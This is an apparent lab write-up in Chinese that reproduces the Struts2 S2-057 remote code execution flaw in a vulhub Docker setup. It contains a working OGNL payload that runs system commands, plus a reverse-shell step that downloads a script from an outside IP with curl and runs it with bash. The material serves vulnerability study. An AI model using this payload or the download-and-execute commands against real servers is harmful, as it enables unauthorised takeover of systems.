ailx10说：这篇是2024年9月之前写的，后来又改过。S2-057 这次反复出现 302，可动作确实发生了。于是我没有只拿状态码判断成败，而是看跳转内容、表达式结果，再用文件和连接作进一步确认。它的入口落在命名空间配置上，我把那几个开关也写进笔记，免得只记下 URL 中的一串表达式。这个过程让我对“返回看起来很正常”多留了个心眼：响应只是观察的一面，配置决定路能不能走通，具体结果还得找对应的证据。

---

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build//可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明 Struts2 S2-057 远程代码执行漏洞 环境搭建成功了

![](/notes-assets/caea7e9a4fdb3397dfb2.webp)

（1）命令执行（数学运算），需要URL编码，尽管响应码302，但是命令执行成功了

```
GET /showcase/%24%7B2*512%7D/actionChain1.action HTTP/1.1
```

![](/notes-assets/b12d7300aef73d49950e.webp)

（2）命令执行（id），需要URL编码，尽管响应码302，但是命令执行成功了

```
${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
```

![](/notes-assets/76572b3781a827bec33e.webp)

（3）反弹shell

首先下载shell文件，然后执行shell文件，最终验证可以成功反弹shell

- 下载shell文件

```
curl 144.34.162.13 -o ailx10.sh
```

![](/notes-assets/e08e62601f18b7835864.webp)

- 执行shell文件

```
bash ailx10.sh
```

![](/notes-assets/381951aedac18f4a429d.webp)

- 反弹shell成功

![](/notes-assets/f87e2f196d4bf7d8e087.webp)

这例离不开特定配置与动态命名空间，路径本身不是万能入口。把配置、计算反馈和后续动作分层保存，才不会把一段URL误读成无条件利用。
